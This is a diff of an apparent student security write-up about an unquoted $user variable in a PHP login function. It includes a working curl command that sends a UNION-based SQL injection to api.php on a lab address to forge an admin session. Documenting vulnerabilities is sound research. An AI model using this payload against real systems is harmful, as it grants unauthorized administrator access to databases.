@@ -109,12 +109,13 @@ function getUpdateUserLoginData(&$row, $user, $password, $table = "users", $next
     }
 }
 ```
-The variable *$user* is used in an SQL statement without any type of quoting. This is then executed using **get_row()** which is a wrapper around an SQL library that just runs SQL queries. Now, the hacker can build a admin session in order to avoid **user** and **pass** login. 
+The variable *$user* is used in an SQL statement without any type of quoting. This is then executed using **get_row()** which is a wrapper around an SQL library that just runs SQL queries. Now, the hacker can build a admin session in order to avoid **user** and **pass** login based on the UNION. 
 ```Python
 # curl command used
 curl -v http://192.168.56.103/api.php -d "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
 ```
-![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/2096952ca2904c53f01479636923d7ca39375454/cvss.png)
+![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/6f21e008f45548a2314105ce8cca4eadc5c30fea/sqli_api_php.png)[^5]
+This will allow access to the database as an administrator. More details can be found [here](https://kerbit.io/research/read/blog/3). 
 
 
 ## The users
